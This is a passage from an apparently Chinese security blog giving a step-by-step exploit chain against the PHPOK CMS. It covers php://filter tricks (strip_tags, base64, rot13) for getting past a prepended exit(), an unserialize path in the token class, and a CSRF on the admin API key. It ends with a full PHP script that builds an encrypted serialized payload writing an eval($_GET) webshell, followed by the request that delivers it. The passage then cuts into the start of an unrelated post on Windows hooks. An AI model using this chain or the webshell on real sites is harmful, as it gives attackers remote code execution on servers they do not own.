class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="绕过exit"><a href="#绕过exit" class="headerlink" title="绕过exit()"></a>绕过exit()</h3><p>save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行，可以通过php://filter伪协议使拼接的<code>&lt;?php exit();?&gt;</code>失效</p>
<p>来源于</p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/981">基于php://filter协议对exit函数几种逃逸方法的分析</a></p>
<h4 id="1-string-strip-tags"><a href="#1-string-strip-tags" class="headerlink" title="1.string.strip_tags"></a>1.string.strip_tags</h4><p><strong>该特性从PHP 7.3.0起废弃</strong></p>
<p><code>&lt;?php exit()?&gt;</code>本质是XML标签，可以使用<code>strip_tags()</code>函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>将&lt;?php phpinfo();进行base64编码后提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>写入成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e328053380001383b3f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fb94221b-0076-4065-834a-17976701d407.png" alt="imgbed.cn图床"></a></p>
<h4 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h4><p>base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>;</code>、<code>(</code>、<code>)</code>等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如<code>&lt;?php exit();?&gt;</code>就会先变成<code>phpexit</code>再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如<code>a</code>，这样就是<code>phpexita</code>再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;aPD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e43002aec00018e1506"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/0689df6f-e7ca-473f-9af4-9f420a2e006e.png" alt="imgbed.cn图床"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e3def338d00016bab21"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/46978b5f-e655-40e5-8eb0-bf09082501ad.png" alt="imgbed.cn图床"></a></p>
<h4 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3.rot13"></a>3.rot13</h4><p><code>&lt;?php exit(); ?&gt;</code>在经过<code>rot13</code>编码后会变成<code>&lt;?cuc rkvg(); ?&gt;</code>，在<code>php</code>不开启<code>short_open_tag</code>时，<code>php</code>不认识这个字符串，也就不会被执行，<code>&lt;?php phpinfo();?&gt;</code>经过rot13编码后的结果为<code>&lt;?cuc cucvasb();?&gt;</code></p>
<p>提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;1.php?a&#x3D;&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e4920be4e0001cb1264"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/c46c68fe-cc7e-4815-8fa6-384b74837f82.png" alt="imgbed.cn图床"></a></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token_lib</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;config();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$string</span> = serialize(<span class="variable">$string</span>);<span class="comment">//序列化</span></span><br><span class="line">		<span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line">		<span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + <span class="keyword">$this</span>-&gt;time)).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;	</span><br><span class="line">		<span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">		<span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line">		<span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$string</span> = str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">		<span class="variable">$keyc</span> = substr(<span class="variable">$string</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">		<span class="variable">$string</span> = base64_decode(substr(<span class="variable">$string</span>, <span class="keyword">$this</span>-&gt;keyc_length));</span><br><span class="line">		<span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">		<span class="variable">$chkb</span> = substr(md5(substr(<span class="variable">$rs</span>,<span class="number">26</span>).<span class="keyword">$this</span>-&gt;keyb),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span>((substr(<span class="variable">$rs</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="keyword">$this</span>-&gt;time &gt; <span class="number">0</span>) &amp;&amp; substr(<span class="variable">$rs</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="variable">$chkb</span>)&#123;</span><br><span class="line">			<span class="variable">$info</span> = substr(<span class="variable">$rs</span>, <span class="number">26</span>);</span><br><span class="line">			<span class="keyword">return</span> unserialize(<span class="variable">$info</span>);<span class="comment">//反序列化</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;lib(<span class="string">&#x27;token&#x27;</span>)-&gt;keyid(<span class="keyword">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在后台找到API验证串设置处 </p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e548053380001383ba6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/cbfb37f0-9677-4d21-85ea-a59dc9835fa9.png" alt="imgbed.cn图床"></a></p>
<p>抓包后发现无csrf防护，构造请求诱导管理员访问即可</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e4ee857bd0001015b56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a1149187-1e39-4700-9605-401363ff929c.png" alt="imgbed.cn图床"></a></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>构造脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_id</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key_list</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_id = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_list = <span class="string">&#x27;aa&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;folder = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">token</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyc_length</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keya</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$keyb</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$time</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$expiry</span> = <span class="number">3600</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">keyid</span>(<span class="params"><span class="variable">$keyid</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$keyid</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="variable">$keyid</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;keyid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">config</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keya = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keyb = md5(substr(<span class="keyword">$this</span>-&gt;keyid, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;keyid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expiry_time</span> = <span class="keyword">$this</span>-&gt;expiry ? <span class="keyword">$this</span>-&gt;expiry : <span class="number">365</span>*<span class="number">24</span>*<span class="number">3600</span>;</span><br><span class="line">        <span class="variable">$string</span> = sprintf(<span class="string">&#x27;%010d&#x27;</span>,(<span class="variable">$expiry_time</span> + time())).substr(md5(<span class="variable">$string</span>.<span class="keyword">$this</span>-&gt;keyb), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$keyc</span> = substr(md5(microtime().rand(<span class="number">1000</span>,<span class="number">9999</span>)), -<span class="keyword">$this</span>-&gt;keyc_length);</span><br><span class="line">        <span class="variable">$cryptkey</span> = <span class="keyword">$this</span>-&gt;keya.md5(<span class="keyword">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line">        <span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;core(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$keyc</span>.str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode(<span class="variable">$rs</span>));</span><br><span class="line">        <span class="comment">//return $keyc.base64_encode($rs);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">core</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$cryptkey</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key_length</span> = strlen(<span class="variable">$cryptkey</span>);</span><br><span class="line">        <span class="variable">$string_length</span> = strlen(<span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$box</span> = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">        <span class="variable">$rndkey</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生密匙簿</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$rndkey</span>[<span class="variable">$i</span>] = ord(<span class="variable">$cryptkey</span>[<span class="variable">$i</span> % <span class="variable">$key_length</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$i</span>] + <span class="variable">$rndkey</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$i</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$i</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 核心加解密部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$a</span> = <span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$string_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="variable">$a</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$a</span>]) % <span class="number">256</span>;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$a</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$a</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">            <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$string</span>[<span class="variable">$i</span>]) ^ (<span class="variable">$box</span>[(<span class="variable">$box</span>[<span class="variable">$a</span>] + <span class="variable">$box</span>[<span class="variable">$j</span>]) % <span class="number">256</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="keyword">new</span> token();</span><br><span class="line"><span class="variable">$token</span>-&gt;keyid(<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>-&gt;encode(serialize(<span class="keyword">new</span> cache));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>运行脚本得到payload</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5f5dc5370001a46220"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ea1a0588-8774-42f4-9c2a-0fa55ed7e6a0.png" alt="imgbed.cn图床"></a>](<a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb">https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb</a>)</p>
<p>在index_cotrol.php中的phpok_f方法中发现调用decode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/1e6a2d1e-93dd-4606-b9e9-a7172ee26902.png" alt="imgbed.cn图床"></a></p>
<p>根据路由规则请求url,token为payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;phpok&#x2F;api.php?c&#x3D;index&amp;f&#x3D;phpok&amp;token&#x3D;478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v&#x2F;RfRV&#x2F;CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz&#x2F;vizU53Wfc64OIB&#x2F;5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU&#x2F;Czv0n&#x2F;UXAGlIl+asWwzpz6pMYfHTbIc5Byug4</span><br></pre></td></tr></table></figure>



<p>利用成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=60208e6534dcf3000102fb90"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ec806660-0cbe-4b59-959d-bfc31b86d382.png" alt="imgbed.cn图床"></a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7852">https://xz.aliyun.com/t/7852</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/985/">https://www.ghtwf01.cn/index.php/archives/985/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/981/">https://www.ghtwf01.cn/index.php/archives/981/</a></p>
<p><a target="_blank" rel="noopener" href="http://althims.com/2020/02/05/phpok-5-4-173/">http://althims.com/2020/02/05/phpok-5-4-173/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-05T04:35:00.000Z" title="2021-02-05T04:35:00.000Z">2021-02-05</time>发表</span><span class="level-item"><time dateTime="2021-02-05T04:35:56.059Z" title="2021-02-05T04:35:56.059Z">2021-02-05</time>更新</span><span class="level-item">14 分钟读完 (大约2151个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/">Windows钩子函数</a></h1><div class="content"><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="钩子原理"><a href="#钩子原理" class="headerlink" title="钩子原理"></a>钩子原理</h1><p>​    Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。</p>
<p>​    钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。</p>
